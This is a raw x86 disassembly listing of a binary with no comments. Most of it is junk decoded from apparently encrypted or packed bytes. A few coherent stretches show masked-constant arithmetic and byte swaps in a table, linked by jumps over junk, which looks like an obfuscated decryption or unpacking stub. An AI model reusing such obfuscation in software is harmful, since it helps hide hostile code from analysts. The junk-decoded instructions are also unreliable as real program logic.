  40bfed:	mov    BYTE PTR [ecx-0x1c467380],al
  40bff3:	xchg   edi,eax
  40bff4:	rcr    BYTE PTR [eax-0x7a],1
  40bff7:	sbb    DWORD PTR [edi],eax
  40bff9:	into   
  40bffa:	dec    ecx
  40bffb:	jbe    0x40c03e
  40bffd:	sbb    eax,0x1f50d82
  40c002:	test   al,0x66
  40c004:	or     ah,BYTE PTR [esi-0x140d495b]
  40c00a:	aaa    
  40c00b:	imul   eax,eax,0x76b8ca03
  40c011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c012:	dec    eax
  40c013:	inc    ecx
  40c014:	imul   esi,DWORD PTR [esi+0x70964ab6],0x23
  40c01b:	mov    al,0x74
  40c01d:	jae    0x40bfc9
  40c01f:	add    BYTE PTR [ecx],bh
  40c021:	push   esi
  40c022:	inc    eax
  40c023:	repz xchg esi,eax
  40c025:	push   esi
  40c026:	or     bl,BYTE PTR [eax+0xb]
  40c029:	adc    ah,BYTE PTR [eax]
  40c02b:	call   0x838:0x8c46f795
  40c032:	cmp    ebx,esi
  40c034:	popf   
  40c035:	dec    esi
  40c036:	push   ss
  40c037:	cmp    BYTE PTR [esi+0x73],dh
  40c03a:	inc    edx
  40c03b:	ss dec esi
  40c03d:	adc    eax,0x1765e2d6
  40c042:	sub    BYTE PTR [esi],cl
  40c044:	xchg   edi,eax
  40c045:	js     0x40bfe9
  40c047:	mov    esp,0xfbd936f4
  40c04c:	cs jne 0x7aeb495b
  40c053:	push   eax
  40c054:	xchg   edx,eax
  40c055:	pop    edx
  40c056:	jmp    0xd7e8:0xb2eecaa3
  40c05d:	ficom  DWORD PTR [ecx+0x57]
  40c060:	fst    st(7)
  40c062:	add    cl,BYTE PTR [ecx]
  40c064:	retf   0xdbd6
  40c067:	mov    ebp,0x907e1fa1
  40c06c:	(bad)  
  40c06d:	jbe    0x40c06c
  40c06f:	fcomp  DWORD PTR [edi+edx*8+0x27]
  40c073:	pushf  
  40c074:	sub    al,0xfc
  40c076:	iret   
  40c077:	jno    0x40c05e
  40c079:	fucomp st(3)
  40c07b:	adc    dl,dl
  40c07d:	leave  
  40c07e:	arpl   WORD PTR [edx+0x5638ff54],cx
  40c084:	sub    cl,dh
  40c086:	clc    
  40c087:	stos   BYTE PTR es:[edi],al
  40c088:	mov    dh,0xe2
  40c08a:	loopne 0x40c095
  40c08c:	adc    BYTE PTR [eax+0x62],dh
  40c08f:	inc    edx
  40c090:	mov    al,ds:0x3986bdd0
  40c095:	out    dx,al
  40c096:	pop    ebx
  40c097:	popf   
  40c098:	and    ebx,DWORD PTR ds:0xf55b4e65
  40c09e:	aaa    
  40c09f:	aad    0xc1
  40c0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0a2:	inc    sp
  40c0a4:	jns    0x40c0ec
  40c0a6:	pop    ss
  40c0a7:	aam    0x3e
  40c0a9:	fisttp WORD PTR [ecx+ecx*8-0x1d339ed2]
  40c0b0:	and    DWORD PTR [ebx+0x6924faac],eax
  40c0b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0b7:	jo     0x40c11b
  40c0b9:	test   BYTE PTR [eax-0x54babbae],dh
  40c0bf:	pop    ds
  40c0c0:	ins    DWORD PTR es:[edi],dx
  40c0c1:	pop    esi
  40c0c2:	push   edi
  40c0c3:	aas    
  40c0c4:	fwait
  40c0c5:	ins    BYTE PTR es:[edi],dx
  40c0c6:	pop    esp
  40c0c7:	mov    ecx,0xdfaa7343
  40c0cc:	xchg   edx,eax
  40c0cd:	div    DWORD PTR [ebp-0x48447ea0]
  40c0d3:	pop    es
  40c0d4:	repz stc 
  40c0d6:	mov    BYTE PTR [ebx],bl
  40c0d8:	sub    ebx,DWORD PTR [ecx-0x36]
  40c0db:	loope  0x40c066
  40c0dd:	fistp  DWORD PTR [ebp+0x5bb2cd2]
  40c0e3:	dec    ebp
  40c0e4:	cmp    eax,0xaa4e260b
  40c0e9:	shl    BYTE PTR [edi],1
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    bp,WORD PTR ds:[eax]
  40c144:	jns    0x40c19d
  40c146:	push   ecx
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c123
  40c150:	dec    ebx
  40c151:	(bad)  [eax]
  40c153:	(bad)  
  40c154:	pusha  
  40c155:	fimul  DWORD PTR [eax]
  40c157:	and    eax,0x1d7b09cf
  40c15c:	xor    DWORD PTR [esi+0x2fffc9cd],ecx
  40c162:	es jl  0x40c1a7
  40c165:	mov    ss,WORD PTR [eax]
  40c167:	shl    BYTE PTR [esi-0x98c1ca7],1
  40c16d:	push   esp
  40c16e:	ins    BYTE PTR es:[edi],dx
  40c16f:	bound  esi,QWORD PTR [ebp-0x4cdc78f5]
  40c175:	cmp    eax,0x660bd3e2
  40c17a:	jb     0x40c147
  40c17c:	inc    ecx
  40c17d:	popa   
  40c17e:	in     al,dx
  40c17f:	ins    DWORD PTR es:[edi],dx
  40c180:	repnz mov al,ds:0xfa571367
  40c186:	fs mov cl,0xb8
  40c189:	pop    ecx
  40c18a:	push   esp
  40c18b:	aad    0x6a
  40c18d:	push   cs
  40c18e:	add    BYTE PTR [edi-0x6b],bh
  40c191:	in     al,0x3d
  40c193:	add    DWORD PTR [ebx+0x3cdf2db8],esi
  40c199:	repnz daa 
  40c19b:	repz jp 0x40c195
  40c19e:	or     BYTE PTR [edx+ebx*1],cl
  40c1a1:	aaa    
  40c1a2:	(bad)  
  40c1a3:	pop    esi
  40c1a4:	pushf  
  40c1a5:	es pop ecx
  40c1a7:	or     DWORD PTR [esi],esp
  40c1a9:	rcr    cl,cl
  40c1ab:	sub    ebp,ebx
  40c1ad:	les    ecx,FWORD PTR [edi]
  40c1af:	sbb    dh,BYTE PTR [ebx]
  40c1b1:	mov    bl,0x25
  40c1b3:	js     0x40c179
  40c1b5:	jmp    DWORD PTR [ebx+0x21]
  40c1b8:	sub    ebx,DWORD PTR [edx+0x37b02f02]
  40c1be:	push   edx
  40c1bf:	sti    
  40c1c0:	dec    ecx
  40c1c1:	fwait
  40c1c2:	add    ebx,DWORD PTR [ecx+0x204ac1bd]
  40c1c8:	test   DWORD PTR ds:0x494e40e0,0xbc1631a0
  40c1d2:	xchg   ebx,eax
  40c1d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1d4:	cmp    DWORD PTR [edx-0x3c46ef75],esi
  40c1da:	stos   BYTE PTR es:[edi],al
  40c1db:	(bad)  
  40c1dc:	mov    dh,0xd2
  40c1de:	and    al,0x50
  40c1e0:	scas   eax,DWORD PTR es:[edi]
  40c1e1:	mov    bh,0x63
  40c1e3:	sub    eax,0x183d778d
  40c1e8:	ds mov esp,0x6dfd2ea5
  40c1ee:	inc    esp
  40c1ef:	cld    
  40c1f0:	cmp    eax,0x16e63d6
  40c1f5:	icebp  
  40c1f6:	es popf 
  40c1f8:	xor    eax,0x1754bde
  40c1fd:	or     al,BYTE PTR ds:0x21334816
  40c203:	cmp    DWORD PTR [esi+0x4a7947ee],edx
  40c209:	je     0x40c250
  40c20b:	fidivr DWORD PTR [ebx-0x1fe0e6c5]
  40c211:	jp     0x40c251
  40c213:	xchg   BYTE PTR [esi-0x1b],bl
  40c216:	mov    eax,ds:0x49864362
  40c21b:	mov    edi,0xcef086a6
  40c220:	push   ebp
  40c221:	jl     0x40c278
  40c223:	mov    ds:0x51a8cfa1,al
  40c228:	or     eax,DWORD PTR ds:0x13afb93d
  40c22e:	aas    
  40c22f:	mov    fs,WORD PTR [ebp-0x2c]
  40c232:	inc    BYTE PTR es:[eax+0xdc7920a]
  40c239:	or     BYTE PTR [ebx-0x48],0xf9
  40c23d:	jb     0x40c206
  40c23f:	or     bh,ah
  40c241:	add    ebp,DWORD PTR [ecx]
  40c243:	popa   
  40c244:	pop    es
  40c245:	dec    esi
  40c246:	fcom   QWORD PTR [edx+0xd]
  40c249:	out    dx,eax
  40c24a:	jmp    0x8c89:0x81daae03
  40c251:	sbb    al,0x4c
  40c253:	outs   dx,BYTE PTR ds:[esi]
  40c254:	std    
  40c255:	aam    0x9f
  40c257:	cmp    eax,0x25b611f
  40c25c:	ss ins BYTE PTR es:[edi],dx
  40c25e:	adc    ch,BYTE PTR [ebx-0x419f307f]
  40c264:	pop    edi
  40c265:	adc    ah,bh
  40c267:	jge    0x40c261
  40c269:	(bad)  
  40c26a:	pushf  
  40c26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c26c:	mov    al,ds:0x7737c3cc
  40c271:	aaa    
  40c272:	jl     0x40c28a
  40c274:	ja     0x40c1ff
  40c276:	in     eax,dx
  40c277:	mov    edx,0xdffffb78
  40c27c:	mov    ah,0xbb
  40c27e:	sti    
  40c27f:	popf   
  40c280:	xchg   BYTE PTR [eax],ah
  40c282:	mov    BYTE PTR ds:0xb51717de,dh
  40c288:	and    DWORD PTR [edi-0xd9b10cf],esi
  40c28e:	lahf   
  40c28f:	add    eax,0x69ddef24
  40c294:	push   es
  40c295:	jg     0x40c2bc
  40c297:	mov    dl,0x61
  40c299:	sbb    DWORD PTR [ebx],ebx
  40c29b:	ds cld 
  40c29d:	enter  0x5f1a,0xc9
  40c2a1:	cs int3 
  40c2a3:	mov    ecx,0xcc932f4c
  40c2a8:	sbb    eax,0xe73d1c05
  40c2ad:	jg     0x40c2a4
  40c2af:	arpl   WORD PTR [esi],bp
  40c2b1:	leave  
  40c2b2:	scas   eax,DWORD PTR es:[edi]
  40c2b3:	push   ss
  40c2b4:	jne    0x40c304
  40c2b6:	fsub   st(5),st
  40c2b8:	dec    eax
  40c2b9:	mov    bl,0x50
  40c2bb:	push   0xffffff85
  40c2bd:	aaa    
  40c2be:	ins    BYTE PTR es:[edi],dx
  40c2bf:	jge    0x40c33b
  40c2c1:	fwait
  40c2c2:	in     eax,0xa8
  40c2c4:	es js  0x40c2bd
  40c2c7:	or     eax,0x5b6653e4
  40c2cc:	inc    ebx
  40c2cd:	or     BYTE PTR [eax],0x6e
  40c2d0:	shl    DWORD PTR [eax+0x5d2f2ff4],cl
  40c2d6:	sti    
  40c2d7:	inc    ebp
  40c2d8:	adc    DWORD PTR [edx+0x4a],esp
  40c2db:	push   esp
  40c2dc:	pusha  
  40c2dd:	fwait
  40c2de:	and    eax,0x87e6da29
  40c2e3:	push   ebp
  40c2e4:	jae    0x40c29b
  40c2e6:	push   0x789f5c0b
  40c2eb:	pop    ds
  40c2ec:	pop    es
  40c2ed:	jbe    0x40c2cd
  40c2ef:	mov    eax,ds:0xaa809b1f
  40c2f4:	ins    BYTE PTR es:[edi],dx
  40c2f5:	test   BYTE PTR [ebx+eiz*1+0x5],cl
  40c2f9:	xlat   BYTE PTR ds:[ebx]
  40c2fa:	data16 (bad) 
  40c2fc:	sar    edx,cl
  40c2fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2ff:	xor    BYTE PTR [ecx-0x3d393aff],ah
  40c305:	div    DWORD PTR [ecx]
  40c307:	ss push edi
  40c309:	xchg   ebp,eax
  40c30a:	jg     0x40c28f
  40c30c:	stos   DWORD PTR es:[edi],eax
  40c30d:	ret    
  40c30e:	mul    DWORD PTR [eax-0x61]
  40c311:	mov    ebx,0xf71c2095
  40c316:	pop    eax
  40c317:	inc    eax
  40c318:	jb     0x40c32c
  40c31a:	mov    ebp,?
  40c31c:	lds    ebx,FWORD PTR [ebp+ebp*4+0x54]
  40c320:	mov    dl,0xad
  40c322:	ds mov esp,0x5f49bdbd
  40c328:	(bad)
  40c32c:	neg    ch
  40c32e:	or     al,0x6a
  40c330:	addr16 push esi
  40c332:	xchg   edx,eax
  40c333:	or     cl,BYTE PTR [edx+0x9]
  40c336:	neg    BYTE PTR [ecx+0x79]
  40c339:	inc    eax
  40c33a:	(bad)  
  40c33c:	pop    ss
  40c33d:	imul   DWORD PTR [ecx+0x20]
  40c340:	inc    esp
  40c341:	rcr    BYTE PTR [edx-0x1e],cl
  40c344:	mov    ds:0xbece85b,al
  40c349:	icebp  
  40c34a:	add    DWORD PTR ss:[eax+eax*1],0x8f6d4e34
  40c352:	adc    al,0x41
  40c354:	mov    ds:0x9cd88cdd,al
  40c359:	aas    
  40c35a:	inc    ecx
  40c35b:	push   0xfdaedb88
  40c360:	xor    edx,DWORD PTR [ebx]
  40c362:	idiv   BYTE PTR [esi+0x1ed69738]
  40c368:	fidivr DWORD PTR [ecx+ecx*8+0x553c2292]
  40c36f:	movhps xmm7,QWORD PTR [esi]
  40c372:	add    eax,0xbe2021db
  40c377:	mov    edi,0xedc8fd32
  40c37c:	or     al,0x1f
  40c37e:	pop    ds
  40c37f:	mov    ss,WORD PTR [eax]
  40c381:	sahf   
  40c382:	cs mov esi,0x33f53bb
  40c388:	cs sbb al,0x91
  40c38b:	or     al,0x7a
  40c38d:	inc    edx
  40c38e:	scas   al,BYTE PTR es:[edi]
  40c38f:	pop    edx
  40c390:	and    BYTE PTR ds:0x4e851f7,bh
  40c396:	js     0x40c354
  40c398:	inc    ecx
  40c399:	inc    ecx
  40c39a:	ficom  WORD PTR [eax]
  40c39c:	mov    dl,0xcd
  40c39e:	jne    0x40c3dd
  40c3a0:	and    eax,0xbad7237
  40c3a5:	mov    ecx,0x48341acf
  40c3aa:	ins    DWORD PTR es:[edi],dx
  40c3ab:	(bad)  
  40c3ac:	aas    
  40c3ad:	inc    ebx
  40c3ae:	ja     0x40c366
  40c3b0:	test   DWORD PTR [ebx-0x3e7a8a49],0xa5cecf2a
  40c3ba:	push   0xffffffd6
  40c3bc:	mov    bl,bl
  40c3be:	shl    DWORD PTR [eax-0x3461d155],1
  40c3c4:	add    bl,cl
  40c3c6:	out    dx,eax
  40c3c7:	shr    BYTE PTR [edi-0x6a],1
  40c3ca:	iret   
  40c3cb:	jnp    0x40c3b5
  40c3cd:	ins    BYTE PTR es:[edi],dx
  40c3ce:	ror    ebx,0xdc
  40c3d1:	sti    
  40c3d2:	jno    0x40c442
  40c3d4:	mov    BYTE PTR [edx+0x7e9dbb44],dh
  40c3da:	addr16 sti 
  40c3dc:	mov    ds:0xaf475c8f,al
  40c3e1:	pop    edi
  40c3e2:	in     eax,dx
  40c3e3:	sub    al,0xa0
  40c3e5:	es nop
  40c3e7:	jae    0x40c3af
  40c3e9:	cwde   
  40c3ea:	es leave 
  40c3ec:	ins    DWORD PTR es:[edi],dx
  40c3ed:	mov    DWORD PTR [eax+0x40],esi
  40c3f0:	mov    al,0x85
  40c3f2:	arpl   WORD PTR [edx],sp
  40c3f4:	outs   dx,DWORD PTR ds:[esi]
  40c3f5:	scas   al,BYTE PTR es:[edi]
  40c3f6:	mov    ch,0xc
  40c3f8:	std    
  40c3f9:	sbb    DWORD PTR [edi+0x4c],eax
  40c3fc:	xchg   BYTE PTR [edx-0x70],al
  40c3ff:	push   edx
  40c400:	sbb    ecx,DWORD PTR [edi]
  40c402:	jne    0x40c466
  40c404:	jo     0x40c47a
  40c406:	imul   edi,esi,0xffffffa0
  40c409:	inc    esi
  40c40a:	mov    BYTE PTR [ebx],al
  40c40c:	mov    dl,0x26
  40c40e:	cwde   
  40c40f:	xor    esp,DWORD PTR [edi+0x64536d87]
  40c415:	in     eax,0x10
  40c417:	dec    esi
  40c418:	push   ebp
  40c419:	push   ecx
  40c41a:	dec    esp
  40c41b:	scas   eax,DWORD PTR es:[edi]
  40c41c:	push   ds
  40c41d:	push   cs
  40c41e:	and    BYTE PTR [edi-0x1b925696],bl
  40c424:	(bad)  
  40c425:	push   esi
  40c426:	lock jb 0x40c3ad
  40c429:	xor    esp,DWORD PTR [edx-0x4a537d0f]
  40c42f:	and    ebx,DWORD PTR [edi-0x26]
  40c432:	ss adc ecx,esi
  40c435:	into   
  40c436:	sub    eax,0xe858e879
  40c43b:	sahf   
  40c43c:	out    dx,al
  40c43d:	dec    ebx
  40c43e:	inc    eax
  40c43f:	test   dh,dl
  40c441:	jnp    0x40c4ad
  40c443:	(bad)  [edi+eiz*8+0x51c37fed]
  40c44a:	imul   ebp,ebx,0x30
  40c44d:	mov    bh,BYTE PTR [ecx+edi*8+0x4e]
  40c451:	bnd jne 0x40c420
  40c454:	ins    DWORD PTR es:[edi],dx
  40c455:	push   eax
  40c456:	shl    bh,cl
  40c458:	xor    ebx,DWORD PTR [edx]
  40c45a:	and    esi,DWORD PTR [edx+0x3147925e]
  40c460:	lahf   
  40c461:	div    DWORD PTR [esi]
  40c463:	test   al,0xe9
  40c465:	sub    DWORD PTR [ecx+0x2b],0xca64cc80
  40c46c:	adc    eax,0xe068d318
  40c471:	xchg   ebx,esp
  40c473:	or     al,0x50
  40c475:	outs   dx,DWORD PTR ds:[esi]
  40c476:	jmp    0x248e:0x984f58a3
  40c47d:	out    0x19,al
  40c47f:	sub    ebx,ecx
  40c481:	(bad)  
  40c482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c483:	retf   0x3870
  40c486:	bound  edx,QWORD PTR [ecx+0x7d]
  40c489:	cmp    BYTE PTR [ebp-0x3c],0xe9
  40c48d:	shl    BYTE PTR [ecx+0x4f],cl
  40c490:	or     BYTE PTR [edi+0x42],ch
  40c493:	test   BYTE PTR [edi],bl
  40c495:	ret    
  40c496:	push   ss
  40c497:	dec    edi
  40c498:	jp     0x40c4ea
  40c49a:	jmpw   0x5850
  40c49e:	pop    eax
  40c49f:	retf   0x5bf3
  40c4a2:	sub    al,0xc4
  40c4a4:	jae    0x40c4c8
  40c4a6:	dec    eax
  40c4a7:	jb     0x40c514
  40c4a9:	add    eax,0xf32326ef
  40c4ae:	rol    DWORD PTR [eax-0x383497ac],cl
  40c4b4:	sub    eax,0x1b4b6e3d
  40c4b9:	fstp   DWORD PTR [edi+ebp*2-0x52b7a872]
  40c4c0:	sbb    al,0xf0
  40c4c2:	test   BYTE PTR [edi],0x6c
  40c4c5:	hlt    
  40c4c6:	(bad)  
  40c4c7:	inc    eax
  40c4c8:	mov    ebx,0xe61c402f
  40c4cd:	mov    cl,BYTE PTR ds:[edx]
  40c4d0:	push   edx
  40c4d1:	push   ds
  40c4d2:	pop    eax
  40c4d3:	sub    DWORD PTR [ecx],eax
  40c4d5:	rcr    DWORD PTR [esi-0x17],0xc3
  40c4d9:	add    BYTE PTR [ebx-0x22f45579],bl
  40c4df:	push   edx
  40c4e0:	shl    al,cl
  40c4e2:	mov    ds:0x893cf55,eax
  40c4e7:	in     al,0x12
  40c4e9:	mov    bh,0xea
  40c4eb:	or     eax,0x505c9b91
  40c4f0:	xor    edx,eax
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	xlat   BYTE PTR ds:[ebx]
  40c541:	mov    al,0x2f
  40c543:	out    0x4d,eax
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c5a5
  40c54d:	fidiv  DWORD PTR [edx+0x51]
  40c550:	mov    BYTE PTR [eax],al
  40c552:	mov    ch,0x4
  40c554:	dec    edi
  40c555:	iret   
  40c556:	iret   
  40c557:	mov    ecx,esp
  40c559:	ds hlt 
  40c55b:	out    0x6a,eax
  40c55d:	dec    edx
  40c55e:	pushf  
  40c55f:	fild   DWORD PTR [ebp-0x37]
  40c562:	mov    bh,0x46
  40c564:	fcmovnu st,st(5)
  40c566:	icebp  
  40c567:	inc    ecx
  40c568:	fs ins DWORD PTR es:[edi],dx
  40c56a:	sbb    DWORD PTR [ebp-0x46af1417],ebp
  40c570:	in     al,0x96
  40c572:	inc    esp
  40c573:	xlat   BYTE PTR ds:[ebx]
  40c574:	xchg   ecx,eax
  40c575:	aam    0xde
  40c577:	mov    dl,0xe3
  40c579:	pop    ds
  40c57a:	lods   al,BYTE PTR ds:[esi]
  40c57b:	add    ebx,DWORD PTR [edx-0x4555b73e]
  40c581:	jl     0x40c555
  40c583:	sub    DWORD PTR [edi],0x994b9655
  40c589:	ins    DWORD PTR es:[edi],dx
  40c58a:	xor    al,0xcc
  40c58c:	inc    ebp
  40c58d:	inc    ebx
  40c58e:	sbb    eax,0xb2a667d9
  40c593:	lahf   
  40c594:	fwait
  40c595:	push   cs
  40c596:	xchg   edx,eax
  40c597:	push   es
  40c598:	mov    ch,0x65
  40c59a:	ficom  DWORD PTR [ecx]
  40c59c:	cwde   
  40c59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c59e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c59f:	jno    0x40c559
  40c5a1:	add    BYTE PTR [ebx-0x25c0a220],0x86
  40c5a8:	lds    eax,FWORD PTR [edx-0xfad6483]
  40c5ae:	push   edx
  40c5af:	jge    0x40c60b
  40c5b1:	dec    ebp
  40c5b2:	fbld   TBYTE PTR [edi]
  40c5b4:	inc    edx
  40c5b5:	arpl   WORD PTR [ebp*4-0x6cb4941],bx
  40c5bc:	cdq    
  40c5bd:	or     dl,BYTE PTR [ecx+esi*4]
  40c5c0:	jae    0x40c5ed
  40c5c2:	dec    edx
  40c5c3:	xor    edx,DWORD PTR [ecx+edx*8+0x41cc6b6a]
  40c5ca:	adc    eax,0x327de61f
  40c5cf:	adc    cl,BYTE PTR [eax]
  40c5d1:	out    dx,al
  40c5d2:	(bad)  
  40c5d3:	test   ch,cl
  40c5d5:	mov    es,WORD PTR [ebx]
  40c5d7:	enter  0xb843,0xc0
  40c5db:	daa    
  40c5dc:	push   ss
  40c5dd:	scas   eax,DWORD PTR es:[edi]
  40c5de:	and    BYTE PTR ds:0xdc4a01ea,ah
  40c5e4:	into   
  40c5e5:	sar    ebp,0x34
  40c5e8:	popf   
  40c5e9:	dec    ebp
  40c5ea:	test   BYTE PTR [ecx-0x4a99ac05],bh
  40c5f0:	jle    0x40c580
  40c5f2:	dec    edi
  40c5f3:	daa    
  40c5f4:	jmp    0xce9b293e
  40c5f9:	arpl   ax,cx
  40c5fb:	jmp    0x40c595
  40c5fd:	add    esp,DWORD PTR [ebx+0x2d5b039c]
  40c603:	xchg   DWORD PTR [edi-0x5fcdfce2],esp
  40c609:	fdiv   DWORD PTR [edi]
  40c60b:	xor    BYTE PTR [ebp+0x4cde6a04],al
  40c611:	pop    ebx
  40c612:	xor    dl,0x54
  40c615:	int3   
  40c616:	add    eax,DWORD PTR [edx+0x273ef090]
  40c61c:	mov    eax,ds:0xef995efa
  40c621:	sbb    esp,esi
  40c623:	cmc    
  40c624:	jo     0x40c66a
  40c626:	xchg   ebp,eax
  40c627:	and    ch,BYTE PTR [ecx]
  40c629:	xchg   ebp,eax
  40c62a:	adc    ecx,DWORD PTR [edx]
  40c62c:	test   ebx,0x6097875a
  40c632:	pop    ebp
  40c633:	xor    eax,0xe6532dc1
  40c638:	sar    esi,cl
  40c63a:	mov    ebx,0x4a9a9696
  40c63f:	in     eax,0xae
  40c641:	fstp   DWORD PTR [esi-0x4fb258b2]
  40c647:	cmc    
  40c648:	popa   
  40c649:	loope  0x40c670
  40c64b:	pop    esi
  40c64c:	jno    0x40c635
  40c64e:	jb     0x40c5f3
  40c650:	inc    ebp
  40c651:	dec    edi
  40c652:	(bad)
  40c656:	mov    ecx,0x83572363
  40c65b:	pop    esp
  40c65c:	mov    BYTE PTR [edx+0x36],ch
  40c65f:	fist   DWORD PTR [esp+eiz*4+0x7dfb30ad]
  40c666:	sub    al,ch
  40c668:	es loopne 0x40c640
  40c66b:	or     edx,edi
  40c66d:	dec    eax
  40c66e:	daa    
  40c66f:	lock loop 0x40c611
  40c672:	and    BYTE PTR [edi-0x33],dl
  40c675:	shr    ecx,0x77
  40c678:	mov    bh,0x75
  40c67a:	xchg   ebx,eax
  40c67b:	xchg   esi,eax
  40c67c:	cmp    BYTE PTR [ecx-0x57],0xee
  40c680:	stos   BYTE PTR es:[edi],al
  40c681:	repnz (bad) 
  40c683:	xchg   edi,eax
  40c684:	xor    DWORD PTR [edi+0x7beca59b],0xf0dcdab6
  40c68e:	in     eax,dx
  40c68f:	lahf   
  40c690:	xchg   ebp,eax
  40c691:	mov    ebp,0x56dd6c39
  40c696:	mov    esi,0xbc28c62d
  40c69b:	fcmovnb st,st(3)
  40c69d:	sub    eax,0x8f45ebd4
  40c6a2:	push   ebx
  40c6a3:	cmp    esi,ebx
  40c6a5:	or     BYTE PTR [edx],bl
  40c6a7:	mov    ss,ebp
  40c6a9:	inc    eax
  40c6aa:	jmp    0xd8a6551a
  40c6af:	ja     0x40c72a
  40c6b1:	jnp    0x40c6ae
  40c6b3:	sbb    esi,ebx
  40c6b5:	mov    eax,ds:0xf1c03346
  40c6ba:	mov    BYTE PTR [eax],al
  40c6bc:	sbb    DWORD PTR [eax+0x7a490790],eax
  40c6c2:	and    eax,0xc1c3ca27
  40c6c7:	adc    ch,dh
  40c6c9:	outs   dx,BYTE PTR ds:[esi]
  40c6ca:	fwait
  40c6cb:	das    
  40c6cc:	fwait
  40c6cd:	push   ebx
  40c6ce:	scas   eax,DWORD PTR es:[edi]
  40c6cf:	push   esp
  40c6d0:	pop    ss
  40c6d1:	jmp    0x51c22f86
  40c6d6:	xor    eax,0xd8c5f217
  40c6db:	js     0x40c685
  40c6dd:	sub    bh,cl
  40c6df:	jg     0x40c72d
  40c6e1:	mov    ecx,0x4dfe31f2
  40c6e6:	gs int3 
  40c6e8:	sub    al,0xc7
  40c6ea:	push   0xffffffe5
  40c6ec:	xchg   DWORD PTR [ebx-0x7f76eec9],ecx
  40c6f2:	out    0xe5,al
  40c6f4:	push   cs
  40c6f5:	lds    esi,FWORD PTR [edi]
  40c6f7:	pop    eax
  40c6f8:	loope  0x40c733
  40c6fa:	cmp    eax,0xbe63c58c
  40c6ff:	pop    eax
  40c700:	dec    ebx
  40c701:	pop    esi
  40c702:	xchg   edx,eax
  40c703:	push   ds
  40c704:	lock sub dl,BYTE PTR [ebx+0x3fdfabf9]
  40c70b:	loope  0x40c75e
  40c70d:	mov    ebx,0x2eaebe16
  40c712:	sahf   
  40c713:	add    DWORD PTR [edx+0xd7c8a74],0x89fcfe08
  40c71d:	vmwrite esi,DWORD PTR [edi]
  40c720:	cmp    ecx,DWORD PTR [ebx-0x3e]
  40c723:	adc    al,0x41
  40c725:	inc    ebp
  40c726:	loop   0x40c6d9
  40c728:	xchg   esi,eax
  40c72a:	add    dl,BYTE PTR [esi+0x72d473bf]
  40c730:	push   0xffffffea
  40c732:	test   bl,bh
  40c734:	or     al,0x88
  40c736:	or     eax,0xca937f28
  40c73b:	inc    esp
  40c73c:	jne    0x40c751
  40c73e:	cdq    
  40c73f:	inc    eax
  40c740:	dec    esi
  40c741:	addr16 cmp eax,0x77433cf0
  40c747:	mov    ebp,0xfc8cad86
  40c74c:	leave  
  40c74d:	rol    BYTE PTR [ebx-0x4b313156],cl
  40c753:	in     al,dx
  40c754:	dec    edx
  40c755:	js     0x40c707
  40c757:	aaa    
  40c758:	mov    dh,0x8
  40c75a:	aas    
  40c75b:	(bad)  
  40c75c:	fstp   QWORD PTR [esi-0x33]
  40c75f:	sbb    DWORD PTR [eiz*1-0x3c84c016],ecx
  40c766:	jmp    0x7eb0:0x9bda53d6
  40c76d:	add    al,al
  40c76f:	jnp    0x40c712
  40c771:	das    
  40c772:	mov    bl,0xa
  40c774:	push   cs
  40c775:	dec    eax
  40c776:	sub    esp,DWORD PTR [ebx-0x74]
